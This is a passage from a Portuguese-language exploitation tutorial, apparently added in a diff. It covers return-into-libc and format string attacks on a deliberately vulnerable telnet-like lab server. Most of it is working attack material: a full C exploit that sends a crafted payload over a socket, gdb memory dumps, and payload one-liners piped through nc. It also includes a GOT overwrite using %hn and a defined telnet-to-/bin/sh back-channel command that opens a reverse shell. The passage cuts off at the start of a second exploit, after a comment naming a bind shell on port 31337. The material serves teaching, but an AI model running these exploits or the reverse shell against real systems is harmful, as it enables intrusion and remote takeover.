+Endereco de exit(): 0x400491a0
+
+Para conseguirmos o endereco do argumento para 'system()' precisaremos do nosso
+servidor rodando e "debugging" da memoria do programa.
+
+Aqui nao iremos querer que o programa salte para uma cadeia de x86 NOPs e caia
+no shellcode. O que queremos e' que o programa salte para uma cadeia de shell
+NOPs e, consequentemente, execute o nosso comando.
+Voce deve estar se perguntando o que seria o shell NOP. Como sabemos, instrucao
+"0x90" nao faz nada para o processador e nao afetara' na nossa exploracao. No
+shell do Linux o equivalente seria "0x20" (o famoso espaco). 
+
+------------------------------------------------------------------
+julio@weiddy:~/rfdslabs$               echo "testando o shell NOP" 
+testando o shell NOP
+------------------------------------------------------------------
+
+O ideal sera' enviar uma longa cadeia de shell NOPs para o alvo e em seguida o
+nosso comando. Assim teremos uma grande probabilidade de sucesso.
+
+=== Mao na massa! Passo 1 (terminal 1) ===
+
+julio@weiddy:~/rfdslabs$ gdb -q servidor-telnetd
+Using host libthread_db library "/lib/libthread_db.so.1".
+(gdb) break autoriza_login
+Breakpoint 1 at 0x8048a22
+(gdb) run
+Starting program: /home/julio/rfdslabs/servidor-telnetd
+Esperando conexao...
+Conexao recebida de 127.0.0.1
+
+Breakpoint 1, 0x08048a22 in autoriza_login ()
+
+
+=== Mao na massa! Passo 2 (va' para o terminal 2) ===
+
+julio@weiddy:~/rfdslabs$ perl -e 'print " "x241, "/bin/echo rfdslabs > teste;",
+"AAAA", "BBBB", "CCCC", "DDDD"' | nc localhost 8080
+   |       |      |        |
+   |       |      |        |
+   |       |      |        |
+ &system  &exit  &arg     &arg
+                 system   exit
+
+=== Mao na massa! Passo 3 (volte para o terminal 1) ===
+
+(gdb) x/200x $esp
+0xbffff1e0:     0x40015f98      0x400155c0      0x400159c4      0x080483bf
+0xbffff1f0:     0xbffff2a0      0x40007130      0x080483bf      0x00078b74
+0xbffff200:     0x08048338      0xbffff25       0x40015978      0x00000001
+0xbffff210:     0x40015fc8      0x00000000      0x00000001      0xffffffff
+0xbffff220:     0x00000883      0x00000000      0xbffff250      0x000004ad
+0xbffff230:     0x0000081a      0x00000351      0x00000000      0x00078b74
+0xbffff240:     0xbffff2e0      0x40015828      0x000001c2      0x00000448
+0xbffff250:     0x40024c84      0x40015d18      0x00000000      0x0000027f
+0xbffff260:     0x00000337      0x00000286      0x000004f3      0x0000073a
+0xbffff270:     0x000006a1      0x00000640      0x00000869      0x0000074b
+0xbffff280:     0x00000744      0x000006d6      0x000004e4      0x00000899
+0xbffff290:     0x000007e5      0x400155c0      0x40015fa8      0x40015828
+...
+0xbffff350:     0x20202020      0x20202020      0x20202020      0x20202020
+0xbffff360:     0x20202020      0x20202020      0x20202020      0x20202020
+0xbffff370:     0x20202020      0x20202020      0x20202020      0x20202020
+0xbffff380:     0x20202020      0x20202020      0x20202020      0x20202020
+0xbffff390:     0x20202020      0x20202020      0x20202020      0x20202020
+0xbffff3a0:     0x20202020      0x20202020      0x20202020      0x20202020
+0xbffff3b0:     0x20202020      0x20202020      0x20202020      0x20202020
+0xbffff3c0:     0x20202020      0x20202020      0x20202020      0x20202020
+0xbffff3d0:     0x20202020      0x20202020      0x20202020      0x20202020
+0xbffff3e0:     0x20202020      0x20202020      0x20202020      0x20202020
+0xbffff3f0:     0x20202020      0x20202020      0x20202020      0x20202020
+0xbffff400:     0x20202020      0x20202020      0x20202020      0x20202020
+0xbffff410:     0x20202020      0x20202020      0x20202020      0x20202020
+0xbffff420:     0x20202020      0x20202020      0x20202020      0x20202020
+0xbffff430:     0x69622f20      0x63652f6e      0x72206f68      0x6c736466
+0xbffff440:     0x20736261      0x6574203e      0x3b657473      0x41414141
+0xbffff450:     0x42424242      0x43434343      0x44444444      0x00000000
+0xbffff460:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffff470:     0x00000000      0x00000000      0x00000000      0x00000000
+...
+(gdb) c
+Continuing.
+Autorizando usuario...
+Armazenando o login do usuario...
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()
+
+Finalmente para acharmos o nosso endereco de retorno basta escolhermos um ende-
+reco entre os da cadeia de shell NOPs, de preferencia um que esteja "no meio"
+(ex.: 0xbffff3a0). Tudo conforme fizemos anteriormente.
+
+Agora que ja' temos todas as informacoes necessarias, segue o nosso payload:
+
+                    EBP      RET
+      (268 bytes)         (4 bytes)    (4 bytes)    (4 bytes)    (4 bytes)
+ |----------------------|------------|------------|------------|------------|
+ | Shell NOPs + comando | 0x40060e80 | 0x400491a0 | 0xbffff3a0 | 0xbffff470 |
+ |----------------------|------------|------------|------------|------------|
+                           &system       &exit      &arg system   &arg exit
+
+
+
+[ --- 2.1.6. Reestruturando o exploit com return-into-libc
+
+   Agora que ja' temos tudo o que precisamos para efetuar este ataque, agora e'
+so' colocar a mao na massa e criar o exploit. Mais uma vez, nao ha' muita dife-
+renca entre exploracao local e exploracao de stack overflow simples remoto, o
+unico diferencial foi o que vimos acima (obtencao dos enderecos libc, os shell
+NOPs, etc.)
+
+Segue abaixo o exploit comentado:
+
+<++ return-into-libc.c ++>
+
+/* Exploit modificado com return-into-libc */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <errno.h>
+#include <signal.h>
+#include <sys/types.h>
+#include <sys/time.h>
+#include <sys/socket.h>
+#include <netdb.h>  
+
+#define PORTA  8080
+#define ERRO   -1
+#define MAX    284
+#define	ALINHA 0
+
+#define SYSADDR  0x40060e80	// endereco de sytem()
+#define EXITADDR 0x400491a0	// endereco de exit()
+#define ARGSYS   0xbffff3a0	// endereco do argumento para system()
+#define ARGEXIT  0xbffff470	// endereco do argumento para exit()
+
+#define	CMD      "/bin/echo testando > teste;"
+/* back-channel antig o :) */
+#define	CMD2     "/bin/telnet ip porta1 | /bin/sh | /bin/telnet ip porta2;"
+
+unsigned char ret2libc_shellcode[] = "\x80\x0e\x06\x40" // Endereco de system()
+                                     "\xa0\x91\x04\x40" // Endereco de exit()
+                                     "\xa0\xf3\xff\xbf" // End. arg. system()
+				     "\x70\xf4\xff\xbf"; // End. arg. exit()
+				     
+int cria_conexao(char *host, unsigned int porta);
+void uso(char *nomeprograma);
+
+int main(int argc, char *argv[])
+{
+	char payload[MAX], *host;
+	int sockfd;
+	unsigned int i, opcao, porta;
+	int alinhamento;
+
+	/* zera o nosso buffer */
+	memset(payload, 0x00, sizeof(payload));
+	host = NULL;
+	porta = PORTA;
+	alinhamento = ALINHA;
+
+	fprintf(stdout, "Exploit return-into-libc para servidor-telnetd.c\n");
+
+	if(argc < 2)
+		uso(argv[0]);
+
+	while((opcao = getopt(argc, argv, "h:p:a:")) != EOF)
+	{
+		switch(opcao)
+		{
+			case 'h':
+				if(strlen(optarg) > 255)
+				{
+					fprintf(stderr, "Tamanho de host invalido.\n");
+					exit(ERRO);
+				}
+				host = optarg;
+				break;
+
+			case 'p':
+				if(atoi(optarg) > 65535 || atoi(optarg) < 0)
+				{
+					fprintf(stderr, "Porta invalida.\n");
+					exit(ERRO);
+				}
+				porta = atoi(optarg);
+				break;
+
+			case 'a':
+				alinhamento = atoi(optarg);
+				break;
+
+			default:
+				uso(argv[0]);
+		}
+	}
+
+	sockfd = cria_conexao(host, porta);
+	
+	/* enchemos com shell NOPs parte do payload, deixando espaco para o
+	 * comando e o shellcode que ja' contem os enderecos e argumentos */
+
+	memset(payload + alinhamento, 0x20, (MAX - strlen(ret2libc_shellcode) - strlen(CMD)));
+
+	/* colocando o nosso comando logo apos os shell NOPs */
+
+	memcpy(payload + alinhamento + (MAX - strlen(ret2libc_shellcode) - strlen(CMD)), CMD, strlen(CMD));
+
+	/* copiando o shellcode para o buffer */
+
+	memcpy(payload + strlen(payload), ret2libc_shellcode, sizeof(ret2libc_shellcode));
+
+	write(sockfd, payload, strlen(payload));
+	fprintf(stdout, "Payload enviado!\n");
+	shutdown(sockfd, SHUT_RDWR);
+	close(sockfd);
+}
+
+int cria_conexao(char *host, unsigned int porta)
+{
+	struct sockaddr_in conexao;
+	struct hostent *hbn;
+	int sockfd;
+
+	/* cria o nosso socket */
+	if((sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == ERRO)
+	{
+		fprintf(stderr, "Erro #%d criando socket principal: %s\n", errno, strerror(errno));
+		exit(ERRO);
+	}
+
+	/* tenta fazer um resolve no host para ver se ele existe */
+	if((hbn = gethostbyname(host)) == NULL)
+	{
+		 fprintf(stderr, "Erro #%d gethostbyname(): Impossivel achar %s.\n", errno, host);
+		 exit(ERRO);
+	}
+
+	/* preenchendo as estruturas de rede */
+	bzero((char *)&conexao,sizeof(conexao));
+	conexao.sin_family = AF_INET;
+	conexao.sin_port = htons(porta);
+	conexao.sin_addr = *((struct in_addr *)hbn->h_addr);
+
+	if(connect(sockfd,(struct sockaddr *)&conexao, sizeof(conexao)) == ERRO)
+	{
+		fprintf(stderr,"Erro #%d: %s.\n", errno, strerror(errno));
+		shutdown(sockfd, SHUT_RDWR);
+		close(sockfd);
+		exit(ERRO);
+	}
+
+	return(sockfd);
+}
+
+void uso(char *nomeprograma)
+{
+	fprintf(stdout, "Uso: %s -h <host> -p [porta] -a [alinhamento]\n", nomeprograma);
+	exit(0);
+}	
+
+<++ return-into-libc.c ++>
+
+
+Assim como feito anteriormente, faremos o processo em passos. Logicamente o
+primeiro passo sera' rodar o servidor vulneravel para faze-lo esperar por cone-
+xoes. O segundo passo e' lancar o ataque atraves do nosso exploit e o terceiro
+e quarto servem somente para confirmarmos o sucesso da exploracao.
+
+
+=== Passo 1 :: rodando o servidor ===
+
+julio@weiddy:~/overflow/gcc-novo$ ./servidor-telnetd
+Esperando conexao...
+
+
+=== Passo 2 (va' para o terminal 2) :: lancando o exploit ===
+
+julio@weiddy:~/overflow/gcc-novo$ ./return-into-libc -h localhost
+Exploit return-into-libc para servidor-telnetd.c
+Payload enviado!
+
+
+=== Passo 3 (volte para o terminal 1) :: confirmando ===
+
+Esperando conexao...
+Conexao recebida de 127.0.0.1
+Autorizando usuario...
+Armazenando o login do usuario...
+sh: line 1: ?@ ?@ óÿ¿pôÿ¿: command not found       <--- NOTE AQUI![!]
+OK! Autorizado o usuario
+
+Onde marcamos [!] podemos ver que o nosso programa teve o fluxo redirecionado,
+escapou para o shell do sistema e executou algo que teve um "output" incompre-
+ensivel (NOPs + shellcode).
+
+
+=== Passo 4 (volte para o terminal 2) :: confirmando novamente ===
+
+julio@weiddy:~/overflow/gcc-novo$ ls -la teste
+-rw-r--r--    1 julio    users           9 Feb 12 18:53 teste
+julio@weiddy:~/overflow/gcc-novo$ cat teste
+testando
+
+Bem, como podemos ver o nosso exploit ficou pequeno e funcionou perfeitamente.
+O grande problema e' que nas glibcs mais recentes os enderecos das funcoes que
+nos sao uteis, como 'system()', 'execl()', por exemplo, tem um "00" no final
+(ex.: 0x40062200), o que significa que nao podemos injeta-lo num array de cara-
+cteres pois 0x00 termina a string. Cabe ao leitor pesquisar sobre as tecnicas
+ja' existentes para contonar estas protecoes ou ate' mesmo criar novas maneiras
+de "bypassing". Caso obtenham algum resultado satisfatorio, por favor entrem em
+contato comigo :)
+
+
+
+[ --- 2.2. Format string attack
+
+   Neste item trataremos de format string bugs. Este tipo de falha chamou aten-
+cao por volta de 2000, com os primeiros exploits publicos tendo sido escritos
+em 1999.[*] Naquela epoca diversos daemons, como o LPRng e o WU-FTPd, continham
+este tipo de falha.
+Hoje em dia bugs de format string sao raros porque a sua correcao e' bastante
+simples. Mesmo assim, para nossa felicidade, ainda e' possivel encontra-los.
+
+[*] O grupo polones LSD afirma dominar a tecnica desde 1992 mas a manteve em
+    segredo ate' o final da decada de 1990.
+
+
+
+[ --- 2.2.1. Breve recapitulacao de format string attack
+
+   Format strings sao strings de caracteres com formatadores especiais. Por
+exemplo a funcao 'printf()' e sua familia, 'syslog()' e familia, entre outras,
+trabalham desta forma.
+
+Da man page de 'printf(3)', temos:
+
+SYNOPSIS
+       #include <stdio.h>
+       int printf(const char *format, ...);
+       ...
+
+Vemos que a quantidade de argumentos passados a 'printf()' nao e' fixo, tendo
+as variaveis que se referenciam a cada especificador de formato sendo os argu-
+mentos posteriores (o mesmo vale para a sua familia).
+
+Alguns especificadores de formato comuns usados com estas funcoes estao abaixo:
+
+%c - Especificador de formato para caracteres.
+%d (ou %i) - Especificador de formato para inteiros.
+%f - Especificador de formato para ponto flutuante.
+%s - Especificador de formato para strings.
+%u - Especificador de formato para inteiros sem sinal (unsigned).
+%x - Especificador de formato para hexadecimal.
+%p - Especificador de formato que mostra o argumento como ponteiro.
+
+A maioria dos livros e tutoriais de C citam e usam bastante os especificadores
+acima e alguns outros que nao serao relevantes ao entendimento da falha. Porem
+existe um outro especificador "obscuro" que e' pouquissimo falado e sera' de
+essencial importancia para a exploracao, o especificador '%n'.
+
+%n - Especificador de formato que armazena em uma variavel o numero de caracte-
+     res escritos ate' o momento.
+%hn - Se usarmos o especificador '%n' combinado com 'h' somos capazes de escre-
+      ver um "short" (16 bits) na memoria, o que equivale a somente metade do
+      endereco.
+
+
+(*) Demonstracao dos especificadores de formato
+
+<++ teste-format.c ++>
+
+/* Demonstracao dos especificadores - exemplo parecido com o GSK modulo 4 */
+#include <stdio.h>
+
+int main(void)
+{
+        char string[] = "Teste da string";
+        int a, i;
+        unsigned int b;
+
+        a = 666;
+        b = -23;	// proposital :)
+        i = 0;
+
+        printf("[a]: Decimal: %d | Unsigned: %u | Hexa: %x\n", a, a, a);
+	printf("[a]: padded com 10 casa decimais: %.10d\n", a);
+        printf("[b]: Decimal: %d | Unsigned: %u | Hexa: %x\n", b, b, b);
+        printf("[string]: %s\n", string);
+        printf("Endereco de string: %p | Endereco de i: %p\n", string, &i);
+        printf("[%%n] Teste%n\n", &i);
+        printf("%d caracteres ate' antes do especificador %%n\n", i);
+}
+
+<++ teste-format.c ++>
+
+O output e' o seguinte:
+
+sandimas@virtualinsanity:~/rfdslabs$ ./teste-format 
+[a]: Decimal: 666 | Unsigned: 666 | Hexa: 29a
+[a]: padded com 10 casa decimais: 0000000666
+[b]: Decimal: -23 | Unsigned: 4294967 73 | Hexa: ffffffe9
+[string]: Teste da string
+Endereco de string: 0xbffff6a0 | Endereco de i: 0xbffff698
+[%n] Teste
+10 caracteres ate' antes do especificador %n
+
+O que acontece na falha de format string e' que se o usuario mal-intencionado
+for capaz de adicionar especificadores de formato sem variaveis correspondentes
+na pilha ele pode fazer "dumping" do stack do programa, possivelmente revelando
+senhas e outras informacoes importantes, e tambem redirecionar o fluxo e obter
+controle do sistema.
+
+
+(*) Lendo a memoria do programa ("dumping" do stack)
+
+Como citado anteriormente e' possivel ler, no tipo que quisermos (string, hexa,
+decimal) qualquer area de memoria que o nosso programa tenha direito a acessar.
+Neste exemplo iremos mostrar como "dumpear" o stack e controlar onde iremos
+ler.
+
+<++ teste-format2.c ++>
+
+/* Exemplo para demonstracao de format string attack */
+
+#include <stdio.h>
+#include <stdlib.h>
+
+int main(int argc, char *argv[])
+{
+        int i;
+        char buffer[32];
+
+        if(argc < 2)
+                exit(-1);
+
+        memset(buffer, '\0', sizeof(buffer));
+        i = 0;
+        snprintf(buffer, sizeof(buffer) - 1, argv[1]);
+        printf("%s\n", buffer);
+        printf("\n");
+}
+
+<++ teste-format2.c ++>
+
+sandimas@virtualinsanity:~/rfdslabs$ ./teste-format2 testando1234
+testando1234
+
+sandimas@virtualinsanity:~/rfdslabs$ ./teste-format2 ABCD.%x.%x.%x.%x.%x.%x.%x
+ABCD.2.44434241.34342e32.323433
+          ^
+          |
+          ----- 44434241 = ABCD, em "little endian"
+
+[*] Equivale a printf("ABCD.%x.%x.%x.%x.%x.%x.%x"), sem argumentos a serem
+    substituidos.
+
+Poderiamos tambem usar o simbolo '$' para acesso direto a parametro, muito util
+quando nao conseguimos atingir o nosso argumento mesmo com muitos '%x' e '%p'.
+No exemplo anterior tivemos que "subir" na pilha atraves dos especificadores
+mas agora usaremos este artificio para acessar diretamente os parametros.
+
+sandimas@virtualinsanity:~/rfdslabs$ ./teste-format2 'ABCD.%2$x'
+ABCD.44434241
+
+Vemos que o 'printf()' pegou parte do conteudo do stack e o traduziu para hexa.
+Entao o que aconteceria se passassemos um endereco de memoria ao inves de um
+simples "ABCD"? Sim! O programa ira' ler o endereco!
+
+Usaremos o "gdb" para facilitar a obtencao do endereco de uma variavel de am-
+biente qualquer.
+
+------------------------------------------------------------
+sandimas@virtualinsanity:~/rfdslabs$ export RFDSLABS="teste"
+
+sandimas@virtualinsanity:~/rfdslabs$ gdb -q teste-format2
+Using host libthread_db library "/lib/libthread_db.so.1".
+(gdb) break main
+Breakpoint 1 at 0x804842a
+(gdb) r
+Starting program: /home/sandimas/rfdslabs/teste-format2 
+
+Breakpoint 1, 0x0804842a in main ()
+(gdb) x/50s 0xbffffffa - 100
+0xbfffff96:      "HORITY=/home/sandimas/.Xauthority"
+0xbfffffb8:      "COLORTERM=rxvt"
+0xbfffffc7:      "RFDSLABS=teste"
+0xbfffffd6:      "/home/sandimas/rfdslabs/teste-format2"
+0xbffffffc:      ""
+0xbffffffd:      ""
+0xbffffffe:      ""
+0xbfffffff:      ""
+0xc0000000:      <Address 0xc0000000 out of bounds>
+0xc0000000:      <Address 0xc0000000 out of bounds>
+...
+---Type <return> to continue, or q <return> to quit---q
+Quit
+(gdb) q
+
+The program is running.  Exit anyway? (y or n) y
+------------------------------------------------------------
+
+Vemos que a variavel de ambiente comeca no endereco 0xbfffffc7.
+
+Vamos usar o nosso programa para ler o conteudo deste endereco: 
+
+-------------------------------------------------------
+sandimas@virtualinsanity:~/rfdslabs$ ./teste-format2 \
+> `printf "\xc7\xff\xff\xbf"`'%2$s'
+ÿÿ¿RFDSLABS=teste
+-------------------------------------------------------
+
+(*) Escrevendo em uma variavel
+
+Ja' sabemos que podemos escrever um valor arbitrario em uma variavel. Portanto
+o nosso exemplo se focara' na variavel "variavelinteira" e iremos alterar o seu
+valor usando o '%n'.
+
+<++ teste-format3.c ++>
+
+/* Exemplo para demonstracao de format string attack */
+
+#include <stdio.h>
+#include <stdlib.h>
+
+int main(int argc, char *argv[])
+{
+        char buffer[32];
+        int  variavelinteira;
+
+        if(argc < 2)
+                exit(-1);
+
+        memset(buffer, 0x00, sizeof(buffer));
+        variavelinteira = 23;
+
+        fprintf(stdout, "O valor de variavelinteira (%p) e' %d\n", &variavelinteira, variavelinteira);
+        snprintf(buffer, sizeof(buffer) - 1, argv[1]);
+        fprintf(stdout, "O valor de buffer e'");
+        fprintf(stdout, buffer);
+        fprintf(stdout, "\n");
+        fprintf(stdout, "O valor de variavelinteira (%p) e' %d\n", &variavelinteira, variavelinteira);
+}
+
+<++ teste-format3.c ++>
+
+---------------------------------------------------------------
+sandimas@virtualinsanity:~/rfdslabs$ ./teste-format3 'AAAA%5$p'
+O valor de variavelinteira (0xbffff65c) e' 23
+O valor de buffer e'AAAA0x17
+O valor de variavelinteira (0xbffff65c) e' 23
+sandimas@virtualinsanity:~/rfdslabs$ ./teste-format3 'AAAA%6$p'
+O valor de variavelinteira (0xbffff65c) e' 23
+O valor de buffer e'AAAA0x41414141
+O valor de variavelinteira (0xbffff65c) e' 23
+---------------------------------------------------------------
+
+Agora que conseguimos o nosso offset (6), e' so' explorarmos da maneira que ja'
+conhecemos:
+
+------------------------------------------------------
+sandimas@virtualinsanity:~/rfdslabs$ ./teste-format3 \
+> `printf "\x5c\xf6\xff\xbf"`'%6$n'                   
+O valor de variavelinteira (0xbffff65c) e' 23
+O valor de buffer e'\öÿ¿
+O valor de variavelinteira (0xbffff65c) e' 4
+------------------------------------------------------
+
+Perceba que o valor de variavel inteira foi alterado e agora e' 4 ao inves do
+valor anterior 23! O que aconteceu e' que enganamos o programa para que ele
+escrevesse no endereco da variavel a quantidade de caracteres escritos ate' o
+momento (um endereco tem 4 bytes.)
+
+Imaginemos que um programa setuid root guarda o EUID (effective user id) de um
+usuario em uma variavel. Se tivessemos uma falha de format string deste tipo
+poderiamos alterar a variavel e alterar o nosso EUID, fazendo o programa pensar
+que somos qualquer um no sistema.
+
+
+(*) Global offset table (GOT)
+
+A GOT e' usada em programas que necessitam de "shared libraries". Ela nao e'
+nada alem de uma tabela para referenciar o endereco final das funcoes da bi-
+blioteca.
+Os binarios ELF acessam a Portable Linkage Table (que e' read-only). Ela con-
+tem ponteiros que fazem "jumps" para a GOT (que e' read/write), servindo como
+uma especie de "wrapper".
+Por exemplo, quando um programa chama a funcao 'fgets()', apos a localizar o
+simbolo, a localizacao e' entao realocada para a GOT, que vai permitir que o
+processo a acesse atraves da PLT.
+
+------------------------------------------------------------
+sandimas@virtualinsanity:~/rfdslabs$ objdump -R teste-format   
+
+teste-format:     file format elf32-i386
+
+DYNAMIC RELOCATION RECORDS
+OFFSET   TYPE              VALUE 
+08049770 R_386_GLOB_DAT    __gmon_start__
+08049780 R_386_JUMP_SLOT   __libc_start_main
+08049784 R_386_JUMP_SLOT   printf
+------------------------------------------------------------
+
+A sobreescrita da GOT significa que se apos a alteracao do valor de uma funcao
+nesta tabela, qualquer referencia posterior `a mesma funcao indicara' que a
+funcao tem um endereco diferente do original (no nosso caso, o endereco onde
+estara' o shellcode.)
+
+
+
+[ --- 2.2.2. Codigo comentado do servidor vulneravel
+
+   Nesta secao usaremos o mesmo servidor de exemplo da exploracao do stack
+overflow.
+
+
+
+[ 2.2.3. Como achar o argumento controlado e onde escrever
+
+   Para sabermos como obter qual argumento nos controlamos, precisaremos, nova-
+mente, fazer um "dumping" do conteudo do stack com '%x' ou '%p'. Devemos lem-
+brar do especificador '$' citado nos topicos anteriores para facilitar a nossa
+tarefa.
+
+Obviamente devemos ter o servidor-telnetd rodando e este e' o primeiro passo:
+
+=== Passo 1 ===
+
+sandimas@virtualinsanity:~/rfdslabs$ ./servidor-telnetd 
+Esperando conexao...
+
+
+Seguindo a logica, o segundo passo e' enviar a nossa string e nossos especifi-
+cadores de formato para o servidor na intencao de analizar o conteudo, em hexa,
+do stack.
+
+=== Passo 2 (va' para o terminal 2) ===
+
+sandimas@virtualinsanity:~/rfdslabs$ nc localhost 8080
+UNIX rfdslabs.com.br version 4.5v build-1985
+login: AAAA.%p.%p.%p.%p
+
+
+No terceiro passo iremos ver o resultado da string fornecida pelo usuario e
+desta forma saberemos qual e' o argumento que controlamos.
+
+=== Passo 3 (volte para o terminal 1) ===
+
+sandimas@virtualinsanity:~/rfdslabs$ ./servidor-telnetd 
+Esperando conexao...
+Conexao recebida de 127.0.0.1
+Autorizando usuario...
+Armazenando o login do usuario...
+OK! Autorizado o usuario AAAA.0x20.0x41414141.0x3278302e
+
+Como claramente podemos ver a nossa cadeia de caracteres, "AAAA", foi mostrada
+pelo programa no segundo argumento.
+Poderiamos mandar a requisicao com o '$' da seguinte forma:
+
+"AAAA.%2$p"
+o retorno seria:
+"OK! Autorizado o usuario AAAA.0x41414141".
+
+Isso seria util se nao conseguissemos atingir o nosso argumento com muitos '%p'
+por motivos diferentes como uma checagem de limites na quantidade de caracteres
+passados ao servidor (neste caso o stack overflow abordado sequer existiria),
+ou se tivessemos um "layout" de memoria muito complexo com certeza seria mais
+facil fazer acesso direto a parametros.
+
+[ --- 2.2.4. Pequeno exemplo de exploracao (sem codigo)
+
+   Agora que ja' temos todas as informacoes em maos, vamos fazer um pequeno
+teste e fazer o servidor saltar para o endereco "0xdeadbeef". Usaremos nada
+alem do shell do sistema e alguns comandos.
+
+=== Passo 1 :: obter o valor de 'fprintf()' na GOT e rodar o servidor ===
+
+sandimas@virtualinsanity:~/rfdslabs$ objdump -R servidor-telnetd | grep fprintf
+08049e78 R_386_JUMP_SLOT   fprintf
+sandimas@virtualinsanity:~/rfdslabs$ ./servidor-telnetd 
+Esperando conexao...
+
+Iremos fazer escritas em dois enderecos consecutivos, portanto nos escreveremos
+em 0x08049e78 e 0x08049e7a
+
+
+=== Passo 2 :: Calcular quanto vale "0xdead" e "0xbeef" em hexa-decimal ===
+
+sandimas@virtualinsanity:~$ gdb -q
+(gdb) printf "%d\n", 0xdead
+57005
+(gdb) printf "%d\n", 0xbeef
+48879
+
+
+=== Passo 3: Explorar! ===
+
+sandimas@virtualinsanity:~/rfdslabs$ echo \
+> `printf "\x78\x9e\x04\x08\x7a\x9e\x04\x08"`'%.48871d%2$hn%.8126d%3$hn' \
+> | nc localhost 8080
+UNIX rfdslabs.com.br version 4.5v build-1985
+
+Voce deve estar se perguntando por que usamos os numeros 48871 para "0xbeef"
+ao inves de 48879. A resposta e' o simples calculo 48879 - 48871 = 8, que e' o
+numero de caracteres escritos ate' entao, que sao os enderecos consecutivos da
+GOT.
+O numero 8126 resulta da operacao decimal entre "0xdead - 0xbeef". Lembre-se
+que o valor de "0xdead" ja' fora escrito, portanto para completar "0xbeef" so'
+precisamos fazer esta subtracao.
+Perceba tambem o uso do especificador %hn, que escreve dois "shorts", somente
+metade necessaria para escrever um endereco completo.
+
+Trocando em miudos, escrevemos "0xbeef" em 0x08049e78 e "0xdead" em 0x08049e7a.
+Esta escrita "ao contrario" deve-se ao modelo "little endian" do x86.
+
+
+=== Passo 4: Verificar o salto para "0xdeadbeef" ===
+
+sandimas@virtualinsanity:~/rfdslabs$ ./servidor-telnetd 
+Esperando conexao...
+Conexao recebida de 127.0.0.1
+Autorizando usuario...
+Segmentation fault (core dumped)
+sandimas@virtualinsanity:~/rfdslabs$ gdb -q servidor-telnetd core
+Using host libthread_db library "/lib/libthread_db.so.1".
+
+warning: core file may not match specified executable file.
+Core was generated by `./servidor-telnetd'.
+Program terminated with signal 11, Segmentation fault.
+Reading symbols from /lib/libc.so.6...done.
+Loaded symbols for /lib/libc.so.6
+Reading symbols from /lib/ld-linux.so.2...done.
+Loaded symbols for /lib/ld-linux.so.2
+#0  0xdeadbeef in ?? ()
+(gdb)
+
+
+(*) Por onde enviar o shellcode e como saber onde ele esta' na memoria
+
+Como da mesma maneira do stack overflow remoto, iremos enviar o nosso "payload"
+junto com as instrucoes para exploracao do bug de format string.
+Para exemplificar, se estivessemos explorando um servidor de ftp, poderiamos
+armazenar o shellcode no campo de "senha", entre outros possiveis lugares.
+
+sandimas@virtualinsanity:~/rfdslabs$ echo \
+> `printf "\x78\x9e\x04\x08\x7a\x9e\x04\x08"`'%.48871d%2$hn%.8126d%3$hn' \
+> `perl -e 'print "\x90"x200'` | nc localhost 8080
+
+sandimas@virtualinsanity:~/rfdslabs$ gdb -q s rvidor-telnetd
+Using host libthread_db library "/lib/libthread_db.so.1".
+(gdb) break autoriza_login
+Breakpoint 1 at 0x8048a82
+(gdb) r
+Starting program: /home/sandimas/rfdslabs/servidor-telnetd 
+Esperando conexao...
+Conexao recebida de 127.0.0.1
+
+Breakpoint 1, 0x08048a82 in autoriza_login ()
+(gdb) x/200wx $esp-200
+0xbfffec38:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbfffec48:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbfffec58:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbfffec68:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbfffec78:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbfffec88:     0x00000000      0x00000000      0x00000000      0x4008bc14
+0xbfffec98:     0x00000000      0x00000000      0x40145ff4      0xbfffecf4
+0xbfffeca8:     0xbfffecd0      0x4008ceb0      0xbfffecf4      0x40148f38
+0xbfffecb8:     0x31323149      0x00000000      0x00148f49      0x400166f4
+0xbfffecc8:     0xbfffece4      0x4000b1ce      0x080483c0      0x40016700
+...
+0xbfffee68:     0x38342e25      0x64313738      0x68243225      0x382e256e
+0xbfffee78:     0x64363231      0x68243325      0x9090906e      0x90909090
+0xbfffee88:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbfffee98:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbfffeea8:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbfffeeb8:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbfffeec8:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbfffeed8:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbfffeee8:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbfffeef8:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbfffef08:     0x90909090      0x90909090      0x90909090      0x90909090
+---Type <return> to continue, or q <return> to quit---
+0xbfffef18:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbfffef28:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbfffef38:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbfffef48:     0x00000a90      0x00000000      0x00000000      0x00000000
+(gdb) c
+Continuing.
+Autorizando usuario...
+
+Program received signal SIGSEGV, Segmentation fault.
+0xdeadbeef in ?? ()
+
+Agora sabemos onde o shellcode esta' guardado na memoria, agora e' so' envia-lo
+juntamente com o payload e pronto!
+Novamente iremos pegar um endereco pelo meio e o escolhido e' 0xbfffeec8.
+
+
+
+[ --- 2.2.5. Estrutura comentada do exploit
+
+<++ fmt-telnetd.c ++>
+
+/* Exploit de format string para servidor-telnetd.c
+ *
+ *    Valeu pela ajuda, barros :)
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <errno.h>
+#include <signal.h>
+#include <sys/types.h>
+#include <sys/time.h>
+#include <sys/socket.h>
+#include <netdb.h>
+
+#define PORTA   8080
+#define	OFFSET  2
+#define ERRO    -1
+#define MAX     512
+
+#define RET    0xbfffeec8         /* endereco de retorno Slackware 10.1 */
+#define RET2   0xbfffed5c         /* endereco de retorno Slackware 10.2 */
+#define GOT    0x08049e78         /* GOT de fprintf() */
+
+/* Linux x86 bind shell port 31337 - from Metasploit Framework (84 bytes) */
